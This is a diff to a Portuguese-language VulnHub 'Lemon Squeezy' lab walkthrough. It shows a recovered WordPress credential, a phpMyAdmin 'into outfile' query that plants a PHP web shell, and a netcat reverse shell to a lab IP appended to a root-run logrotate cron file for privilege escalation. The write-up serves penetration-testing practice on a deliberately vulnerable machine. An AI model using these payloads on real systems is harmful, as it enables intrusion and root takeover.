@@ -1,6 +1,6 @@
 ---
 title: "VulnHub - Lemon Squeezy"
-tags: [Linux, Medium]
+tags: [Linux, Medium, Gobuster, Wordpress, Phpmyadmin, Cron]
 categories: VulnHub OSCP
 ---
 
@@ -134,3 +134,68 @@ Verificamos um post interessante que tem o que parece ser uma senha, vamos salva
 
 `n0t1n@w0rdl1st!`
 
+Não conseguimos RCE nesse Wordpress
+
+## Login phpmyadmin
+
+Já que não conseguimos nada ai, vamos tentar entrar no phpmyadmin que também temos disponível nele, e tentar RCE ali
+
+Tentamos com essa senha nova que encontramos...
+
+orange:n0t1n@w0rdl1st!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/php.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/php1.png)
+
+select "<?php echo shell_exec($_GET['cmd']);?>" into outfile '/var/www/html/wordpress/shell.php'
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/php2.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/php3.png)
+
+Testamos o RCE, e temos!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/php4.png)
+
+# www-data - Root
+
+Agora pegamos um shell de www-data
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/rev.png)
+
+Rodamos o linpeas para buscar pontos de escalação de privilégios
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/lin.png)
+
+Baixamos
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/lin1.png)
+
+Executamos
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/lin3.png)
+
+Encontramos uma cron sendo executado a cada 2 min, como root
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/lin2.png)
+
+Verificamos ele
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/log.png)
+
+Vemos que podemos escrever nesse arquivo, então agora ficou fácil de fazer o nosso reverse shell
+
+```bash
+echo -n "os.system('nc -e /bin/bash 192.168.56.102 443')" >> /etc/logrotate.d/logrotate
+```
+
+Adicionamos nosso shell reverso e esperamos a conexão vir
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/root.png)
+
+Pegamos as duas flags
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/flag.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/flag1.png)
